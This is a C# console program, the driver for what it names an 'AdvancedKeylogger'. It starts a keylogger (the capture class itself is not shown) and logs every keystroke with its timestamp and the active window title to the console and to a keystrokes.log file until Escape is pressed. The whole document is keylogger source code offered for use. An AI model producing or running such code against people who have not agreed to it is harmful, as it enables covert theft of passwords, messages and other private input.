using System;
using System.IO;
using System.Threading;

namespace AdvancedKeylogger
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("=== Keylogger Started ===");
            Console.WriteLine("Press ESC to stop logging\n");

            using var logger = new Keylogger();
            string logPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "keystrokes.log");

            // Subscribe to captured keystrokes
            logger.KeyCaptured += (_, e) =>
            {
                // Log everything to console
                Console.WriteLine($"[{e.WindowTitle}] {e.Text}");

                // Append to file
                File.AppendAllText(logPath, $"{e.Timestamp:yyyy-MM-dd HH:mm:ss.fff} | {e.WindowTitle} | {e.Text}\n");
            };

            // Start with callback (optional second handler — you can use event OR callback, or both)
            logger.Start(args =>
            {
                // Stop on Escape
                if (args.Text == "[Escape]")
                {
                    Console.WriteLine("\nEscape pressed. Shutting down...");
                    logger.Stop();
                }
            });

            // Keep app alive until logger stops
            while (true)
            {
                Thread.Sleep(100);
            }
        }
    }
}